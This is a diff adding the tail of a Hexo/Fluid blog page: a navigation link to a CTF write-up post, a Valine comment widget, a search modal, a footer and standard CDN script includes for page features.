+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/" title="2024ciscn-ccb初赛部分wp">
+                        <span class="hidden-mobile">2024ciscn-ccb初赛部分wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"5oPqGOgpqzM186wdJq3YyrcV-gzGzoHsz","appKey":"tdZv3tC3tP1IszSKxEodRe6e","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
